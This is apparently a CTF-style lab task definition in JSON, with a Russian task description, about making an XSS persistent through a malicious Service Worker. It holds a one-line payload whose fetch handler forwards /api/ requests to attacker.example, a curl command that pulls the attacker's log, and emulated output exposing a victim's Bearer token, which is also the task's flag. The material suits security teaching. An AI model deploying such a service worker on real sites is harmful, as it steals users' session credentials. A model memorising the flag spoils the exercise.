@@ -1,0 +1,42 @@
+{
+  "id": "web-service-worker",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{s3rv1c3_w0rk3r_p3rs1st3nt_xss}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: Service Worker перехватывает трафик\n\nНа `app.example` подтверждена XSS. Мы хотим сделать её **постоянной**:\nзарегистрировать Service Worker, который перехватывает запросы и уводит их на\nсервер атакующего.\n\n1. Напиши `evil-sw.js` — SW с обработчиком `fetch`, логирующим запросы к `/api/`:\n\n   echo 'self.addEventListener(\"fetch\", e => { if (e.request.url.includes(\"/api/\")) fetch(\"https://attacker.example/log?u=\"+e.request.url) })' > evil-sw.js\n\n2. SW работает и после закрытия вкладки: все запросы к `/api/` утекают на\n   `attacker.example` (в том числе заголовок `Authorization` жертвы).\n\n3. Забери лог атакующего в `found.txt`:\n\n   curl -s https://attacker.example/log > found.txt\n\n4. Набери `check` — он проверит и `evil-sw.js`, и утёкший токен.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция app.example / attacker.example)",
+      "cases": [
+        {
+          "match": "attacker\\.example",
+          "example": "-s https://attacker.example/log",
+          "output": "[sw-log] intercepted requests from app.example origin:\n  GET /api/session\n  Authorization: Bearer nto{s3rv1c3_w0rk3r_p3rs1st3nt_xss}\n  GET /api/orders\n"
+        },
+        {
+          "match": "app\\.example/api",
+          "example": "-s https://app.example/api/session",
+          "output": "{\"ok\":true}\n"
+        },
+        {
+          "match": "app\\.example",
+          "example": "-s https://app.example/",
+          "output": "<!doctype html><title>app.example</title>\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется app.example.\n"
+    }
+  }
+}
